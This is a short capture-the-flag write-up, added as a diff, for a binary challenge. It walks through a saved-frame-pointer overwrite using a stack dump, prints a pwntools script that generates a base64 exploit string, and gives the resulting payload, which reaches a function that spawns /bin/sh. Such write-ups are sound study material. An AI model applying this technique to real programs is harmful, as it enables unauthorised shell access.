@@ -1,0 +1,57 @@
+This is how the stack looks:
+
+0xffffda00:	0xffffda20	0x0811eb40	0x00000004	0x08120aa8
+0xffffda10:	0x08120aa8	0x081209e8	0x00000004	0x00000004
+0xffffda20:[0x080481d0	0x00000000	0xffffda78]	0x08049407
+0xffffda30:	0x00000004	0x081209b8	0x00000004	0x00000000
+0xffffda40:	0x00000001	0xffffdb04	0x081209b8	0x55510001
+
+Of these only the last word is intresting, it holds the SFP.
+(we know so because ebp points to its address)
+
+We will write a payload with
+
+[JUNK | RETURN ADDRESS | SFP VALUE]
+
+We let the return address be that of correct.
+We let the SFP value be that of the input variable (in the binary)
+
+What happens:
+
+1. The SFP value is overwritten in "auth"
+2. When returning:
+	ESP <- EBP
+	EBP <- ESP / SFP (our value)
+	RET
+3. Now in main
+4. When returning:
+	ESP <- EBP        (our value)
+	EBP <- ESP / JUNK (remember the first word is junk)
+	RET               (remember second word is return address)
+
+Almost there, "Correct" looks like this:
+
+void correct() {
+  if (input == 0xdeadbeef) {
+    puts("Congratulation! you are good!");
+    system("/bin/sh");
+  }
+  exit(0);
+}
+
+We could return directly above the system,
+we can also just make JUNK = 0xdeadbeef.
+
+Code to generate exploit string:
+
+#!/usr/bin/python2
+
+from pwn import *
+
+junk  = p32(0xdeadbeef) # This will get popped into ebp (when leaving auth)
+ret   = p32(0x08049278) # This will be the ret address of main
+input = p32(0x0811eb40) # This will be the ebp of main (address of input)
+
+print b64e(junk + ret + input)
+
+Which gives: 776t3niSBAhA6xEI
